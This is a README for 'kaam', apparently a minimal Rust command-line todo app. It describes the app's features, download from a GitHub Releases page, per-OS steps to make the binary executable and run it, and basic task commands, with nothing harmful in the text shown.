# 🚀 kaam - Your Simple Command-Line Todo App

[![Download kaam](https://img.shields.io/badge/Download-kaam-blue.svg)](https://github.com/Abbylatz/kaam/releases)

**kaam** (meaning "work" in Hindi) is a fast and minimal command-line todo app written in Rust. This terminal-based task manager helps you track your todos directly from the command line. No graphical user interface, no clutter—just straightforward and efficient task management.

## 🌟 Features

- **Fast & Lightweight**  
  kaam is built in Rust. This ensures speed and minimal resource usage.

- **Colorful Output**  
  Enjoy priority-based color coding for quick visual scanning of your tasks.

- **Priority Levels**  
  Organize your tasks by low, medium, or high priority for effective planning.

- **Due Dates**  
  Set deadlines to help you stay on track with your tasks.

- **Filtering**  
  List tasks by status or priority, making task management easier.

- **Persistent Storage**  
  Tasks are saved locally in JSON format, so you won’t lose your data.

- **Zero Dependencies at Runtime**  
  kaam is a single binary application that works offline.

## 🚀 Getting Started

To get started with kaam, follow these simple steps to download and run the application.

### 1. Visit the Release Page

To download kaam, visit the [Releases page](https://github.com/Abbylatz/kaam/releases). This page contains the latest version of the application, along with any previous versions. 

### 2. Download the Application

On the Releases page, locate the latest release. Click on the appropriate link for your operating system. The application should download automatically.

### 3. Install and Run kaam

#### Windows

1. Navigate to the folder where you downloaded the file.
2. If you see a .exe file, double-click it to run kaam. Follow the on-screen instructions to complete the setup.

#### macOS

1. Open the Terminal.
2. Navigate to the folder where the downloaded file is.
3. Change permissions if necessary:  
   ```bash
   chmod +x kaam
   ```
4. Run the application:  
   ```bash
   ./kaam
   ```

#### Linux

1. Open your terminal.
2. Move to the download directory:
   ```bash
   cd ~/Downloads
   ```
3. Change permissions if necessary:  
   ```bash
   chmod +x kaam
   ```
4. Run the application:  
   ```bash
   ./kaam
   ```

## 📥 Download & Install

To download kaam, please visit this page: [Download kaam](https://github.com/Abbylatz/kaam/releases).

After downloading, follow the instructions above for your operating system to install and run the application.

## 🔧 Usage

Once you have installed kaam, you can begin adding tasks right away. Here are some essential commands to help you get started:

- **Add a Task:**  
  To add a task, run:
  ```bash
  kaam add "Your task description"
  ```

- **List All Tasks:**  
  View your tasks with:
  ```bash
  kaam list
  ```

- **Remove a Task:**  
  Delete a task by specifying the task number:
  ```bash
  kaam remove <task_number>
  ```

- **Mark Task as Done:**  
  To mark a task as completed:
  ```bash
  kaam done <task_number>
  ```

- **Set a Due Date:**  
  Assign a deadline to your task:
  ```bash
  kaam due <task_number> "YYYY-MM-DD"
  ```

### Example Use Case

Imagine you have a busy day ahead. You can quickly add your tasks like this:
```bash
kaam add "Finish project report"
kaam add "Call the client"
kaam add "Prepare for team meeting"
```

Then, list them to see your tasks:
```bash
kaam list
```

You can easily check off tasks as you complete them. This seamless process makes organizing your work straightforward.

## 🔍 Troubleshooting

If you run into any issues, consider the following solutions:

- **Command Not Found:** Make sure the application is in your PATH. Check your download folder and ensure you are running the executable from there.

- **Permission Denied:** If you receive a permission error, ensure you have executed the command to change permissions.

- **Can’t Find Task:** Ensure you are using the correct task number when trying to remove or mark a task as done.

For additional help, check the issues section on the [GitHub repository](https://github.com/Abbylatz/kaam).

## 📞 Community and Support

If you need further assistance, feel free to engage with the community or even contribute to kaam.

- You can ask questions or report issues at the [Issues page](https://github.com/Abbylatz/kaam/issues).
- Join discussions to share improvements or suggest new features.

## 📝 Contributing

If you want to contribute to kaam, you are welcome to do so! Here’s how:

1. Fork the repository.
2. Create a new branch for your changes.
3. Make your changes and commit them.
4. Push to your fork and create a pull request.

Your contributions will help improve the application for everyone.

## 📚 Related Topics

- **Productivity Tools**: Explore more command-line tools for enhancing your productivity.
- **Task Management**: Learn strategies to manage tasks effectively.
- **Rust Programming**: Discover more applications built with Rust for efficient performance.

Now that you've installed kaam, enjoy managing your tasks efficiently!